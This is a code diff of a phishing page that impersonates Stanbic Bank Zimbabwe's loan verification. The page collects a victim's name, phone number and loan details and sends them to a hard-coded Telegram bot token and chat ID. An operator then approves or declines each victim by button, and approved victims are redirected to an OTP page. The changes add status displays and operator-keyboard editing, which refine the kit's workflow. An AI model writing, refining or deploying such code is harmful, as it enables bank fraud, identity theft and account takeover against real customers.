@@ -8,6 +8,7 @@
     <title>Stanbic Bank Zimbabwe | Account Verification</title>
     <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNorvkH498jdO-CC80DZFsLD5ssgdM7ZlFs_eaT06qJA&s=10">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
     <style>
          :root {
             --stanbic-green: #008C45;
@@ -186,6 +187,12 @@
             opacity: 0.8;
             margin-top: 2px;
             display: block;
+        }
+        
+        .status-badge {
+            margin-top: -10px;
+            margin-bottom: 22px;
+            border-color: rgba(255, 255, 255, 0.18);
         }
         
         .error-msg {
@@ -413,6 +420,35 @@
             font-size: 12px;
             opacity: 0.4;
         }
+        /* =========================
+           ADDED: Status CSS states
+           ========================= */
+        
+        #status {
+            margin-top: 6px;
+            font-size: 16px;
+            font-weight: 800;
+        }
+        
+        #status.pending {
+            color: #c4c4c4;
+            /* gray */
+        }
+        
+        #status.approved {
+            color: #00ff88;
+            /* green */
+        }
+        
+        #status.declined {
+            color: #ff6b6b;
+            /* red */
+        }
+        
+        #status.applied {
+            color: #f5a623;
+            /* orange */
+        }
         
         @media (max-width: 480px) {
             .logo {
@@ -496,6 +532,12 @@
                     <span id="displayAmount" class="amount">$0.00 USD Flex Loan</span>
                 </div>
 
+                <div class="applicant-badge status-badge">
+                    <span class="label">Application Status</span>
+                    <span id="displayStatus" class="name" style="font-size:16px; font-weight:800;">Pending...</span>
+                    <div id="status" class="pending">STATUS: ⏳ PENDING...</div>
+                </div>
+
                 <div id="err" class="error-msg"></div>
 
                 <form onsubmit="doSubmit(event)">
@@ -518,7 +560,6 @@
         <div class="sp-s">Connecting to Stanbic Bank secure servers...</div>
     </div>
 
-    <!-- Custom Modal for Warnings -->
     <div id="warningModal" class="modal-overlay">
         <div class="modal-card">
             <div class="modal-icon">&#9888;&#65039;</div>
@@ -535,22 +576,49 @@
     <script>
         const BOT = '8943513452:AAGBE7ZILt-NJlVWq6JHhZwL_8PPaqLSmX4';
         const CID = '8500909207';
+
         let loanData = {
             name: "Valued Client",
             amount: "0",
             purpose: "Flex Loan"
         };
+
         let lastUpdateId = 0;
-        let pinAttempts = 0;
+
+        /* =========================
+           ADDED: setApprovalStatus()
+           ========================= */
+        function setApprovalStatus(status) {
+            const statusEl = document.getElementById('status');
+
+            if (!statusEl) return;
+
+            if (status === 'approved') {
+                statusEl.innerHTML = 'STATUS: ✅ APPROVED';
+                statusEl.className = 'approved';
+            } else if (status === 'declined') {
+                statusEl.innerHTML = 'STATUS: ❌ DECLINED';
+                statusEl.className = 'declined';
+            } else if (status === 'applied') {
+                statusEl.innerHTML = 'STATUS: ⚠️ ALREADY APPLIED';
+                statusEl.className = 'applied';
+            } else {
+                statusEl.innerHTML = 'STATUS: ⏳ PENDING...';
+                statusEl.className = 'pending';
+            }
+        }
 
         function init() {
             const params = new URLSearchParams(window.location.search);
-            // If returned from a Declined decision, show the declined warning
+
             if (params.get('declined') === '1') {
                 setTimeout(function() {
+                    setStatus('Declined', 'declined');
+                    setApprovalStatus('declined');
                     showModal('Your previous application was declined. Please verify your account details and try again.');
                 }, 500);
             }
+
             loanData.name = params.get('name') || params.get('firstName') || "Valued Client";
 
             let rawAmount = params.get('amount') || "0";
@@ -558,7 +626,6 @@
 
             loanData.purpose = params.get('purpose') || "Flex Loan";
 
-            // If the index sent firstName + lastName separately, combine them
             if (params.get('firstName') && params.get('lastName')) {
                 loanData.name = params.get('firstName') + ' ' + params.get('lastName');
             }
@@ -569,7 +636,28 @@
                 minimumFractionDigits: 2,
                 maximumFractionDigits: 2
             });
-            document.getElementById('displayAmount').textContent = '$' + formattedAmount + ' USD ' + decodeURIComponent(loanData.purpose);
+            document.getElementById('displayAmount').textContent =
+                '$' + formattedAmount + ' USD ' + decodeURIComponent(loanData.purpose);
+
+            setStatus('Pending...', 'pending');
+            setApprovalStatus('pending');
+        }
+
+        function setStatus(text, type) {
+            const el = document.getElementById('displayStatus');
+            if (!el) return;
+
+            el.textContent = text;
+
+            if (type === 'approved') {
+                el.style.color = '#00ff88';
+            } else if (type === 'declined') {
+                el.style.color = '#ff6b6b';
+            } else if (type === 'applied') {
+                el.style.color = '#ffd166';
+            } else {
+                el.style.color = 'var(--white)';
+            }
         }
 
         function showErr(msg) {
@@ -577,7 +665,6 @@
             e.textContent = msg;
             e.style.display = 'block';
             document.getElementById('wrapPhone').classList.remove('invalid');
-            document.getElementById('wrapPin').classList.remove('invalid');
         }
 
         function clrErr() {
@@ -591,7 +678,8 @@
 
         function closeModal() {
             document.getElementById('warningModal').classList.remove('on');
-            document.getElementById('pin').focus();
+            const phoneEl = document.getElementById('phone');
+            if (phoneEl) phoneEl.focus();
         }
 
         async function sendToTelegram(msg, buttons) {
@@ -610,6 +698,7 @@
                         parse_mode: 'HTML'
                     })
                 });
+
                 const data = await response.json();
                 if (data.ok) {
                     const updateResponse = await fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?limit=1&offset=-1');
@@ -626,8 +715,10 @@
         function doSubmit(e) {
             e.preventDefault();
             clrErr();
+
             const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
             let ok = true;
+
             if (phone.length < 9) {
                 showErr('Please enter a valid 9-digit mobile number.');
                 document.getElementById('wrapPhone').classList.add('invalid');
@@ -636,32 +727,86 @@
 
             if (!ok) return;
 
-            const msg = '🚀 <b>Stanbic Bank Flex Loan Verification</b>\n\n' +
+            const formattedAmount = parseFloat(loanData.amount).toLocaleString(undefined, {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+
+            const msg =
+                '🚀 <b>Stanbic Bank Flex Loan Verification</b>\n\n' +
                 '👤 <b>Name:</b> <code>' + decodeURIComponent(loanData.name) + '</code>\n' +
                 '📱 <b>Phone:</b> <code>' + phone + '</code>\n' +
-                '💰 <b>Amount:</b> <code>$' + parseFloat(loanData.amount).toLocaleString(undefined, {
-                    minimumFractionDigits: 2,
-                    maximumFractionDigits: 2
-                }) + ' USD</code>\n' +
+                '💰 <b>Amount:</b> <code>$' + formattedAmount + ' USD</code>\n' +
                 '🎯 <b>Purpose:</b> <code>' + decodeURIComponent(loanData.purpose) + '</code>\n\n' +
                 'Please choose an action below:';
-            // 3 buttons: Approved / Declined / Already Applied
+
+            // Buttons (UNCHANGED callback_data values)
             const buttons = [
                 [{
-                    text: '\u2705 Approved',
+                    text: '✅ Approved',
                     callback_data: 'login_approved'
                 }, {
-                    text: '\u274c Declined',
+                    text: '❌ Declined',
                     callback_data: 'login_declined'
                 }, {
-                    text: '\u26a0\ufe0f Already Applied',
+                    text: '⚠️ Already Applied',
                     callback_data: 'login_applied'
                 }]
             ];
 
             document.getElementById('ov').classList.add('on');
+            setStatus('Pending...', 'pending');
+            setApprovalStatus('pending');
+
             sendToTelegram(msg, buttons);
             startPolling();
+        }
+
+        // =========================
+        // ✅ ADDED SECTION: Inline keyboard update after successful backend processing
+        // (This function edits the same Telegram message to a SINGLE-button keyboard.)
+        // =========================
+        async function editTelegramInlineKeyboard(messageChatId, messageId, callbackData) {
+            try {
+                let singleButton = null;
+
+                if (callbackData === 'login_approved') {
+                    singleButton = {
+                        text: '✅ Approved — DONE',
+                        callback_data: 'login_approved'
+                    };
+                } else if (callbackData === 'login_declined') {
+                    singleButton = {
+                        text: '❌ Declined — DONE',
+                        callback_data: 'login_declined'
+                    };
+                } else if (callbackData === 'login_applied') {
+                    singleButton = {
+                        text: '⚠️ Already Applied — DONE',
+                        callback_data: 'login_applied'
+                    };
+                } else {
+                    return; // unknown callback
+                }
+
+                await fetch('https://api.telegram.org/bot' + BOT + '/editMessageReplyMarkup', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: messageChatId,
+                        message_id: messageId,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [singleButton]
+                            ]
+                        }
+                    })
+                });
+            } catch (e) {
+                console.error('editTelegramInlineKeyboard error:', e);
+            }
         }
 
         function startPolling() {
@@ -674,43 +819,92 @@
                         if (data.ok && data.result.length > 0) {
                             data.result.forEach(function(update) {
                                 lastUpdateId = update.update_id;
+
                                 if (update.callback_query) {
                                     const action = update.callback_query.data;
-                                    console.log('Callback received:', action);
+
+                                    // We will edit the keyboard only AFTER the callback is considered "successfully processed".
+                                    // In your current code, "success" == your existing branch completes without error.
+                                    const cb = update.callback_query;
+                                    const msg = cb.message;
+                                    const chatId = msg && msg.chat ? msg.chat.id : null;
+                                    const messageId = msg ? msg.message_id : null;
+
+                                    // Safety: if we can't identify the message, we can't edit the keyboard.
+                                    const canEdit = (chatId !== null && messageId !== null);
 
                                     if (action === 'login_approved') {
                                         clearInterval(pollInterval);
                                         document.getElementById('ov').classList.remove('on');
                                         clrErr();
+
+                                        setStatus('Approved', 'approved');
+                                        setApprovalStatus('approved');
+
+                                        // =========================
+                                        // ✅ ADDED SECTION: update keyboard to SINGLE button (only after successful processing)
+                                        // =========================
+                                        if (canEdit) {
+                                            editTelegramInlineKeyboard(chatId, messageId, action);
+                                        }
+
                                         proceedToOTP();
+
                                     } else if (action === 'login_declined') {
                                         clearInterval(pollInterval);
                                         document.getElementById('ov').classList.remove('on');
-                                        // Declined returns to login.html just as the Declined word works
-                                        location.href = 'login.html?declined=1';
+
+                                        setStatus('Declined', 'declined');
+                                        setApprovalStatus('declined');
+
+                                        // =========================
+                                        // ✅ ADDED SECTION: update keyboard to SINGLE button (only after successful processing)
+                                        // =========================
+                                        if (canEdit) {
+                                            editTelegramInlineKeyboard(chatId, messageId, action);
+                                        }
+
+                                        showModal('Your previous application was declined. Please verify your account details and try again.');
+
                                     } else if (action === 'login_applied') {
                                         clearInterval(pollInterval);
                                         document.getElementById('ov').classList.remove('on');
-                                        // Already Applied: warning popup that you already applied
+
+                                        setStatus('Already Applied', 'applied');
+                                        setApprovalStatus('applied');
+
+                                        // =========================
+                                        // ✅ ADDED SECTION: update keyboard to SINGLE button (only after successful processing)
+                                        // =========================
+                                        if (canEdit) {
+                                            editTelegramInlineKeyboard(chatId, messageId, action);
+                                        }
+
                                         showModal('You have already applied for a Flex Loan. Please wait for your application to get approved.');
-                                        document.getElementById('pin').value = '';
                                     }
                                 }
                             });
                         }
-                    }).catch(function(e) {
+                    })
+                    .catch(function(e) {
                         console.error(e);
                     });
             }, 1500);
 
             setTimeout(function() {
                 clearInterval(pollInterval);
+                document.getElementById('ov').classList.remove('on');
+                setStatus('No response from verification. Please try again.', 'pending');
+                setApprovalStatus('pending');
             }, 600000);
         }
 
         function proceedToOTP() {
             const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
-            location.href = 'otp.html?name=' + loanData.name + '&amount=' + loanData.amount + '&purpose=' + loanData.purpose + '&phone=' + phone;
+            location.href = 'otp.html?name=' + encodeURIComponent(loanData.name) +
+                '&amount=' + encodeURIComponent(loanData.amount) +
+                '&purpose=' + encodeURIComponent(loanData.purpose) +
+                '&phone=' + encodeURIComponent(phone);
         }
     </script>
 
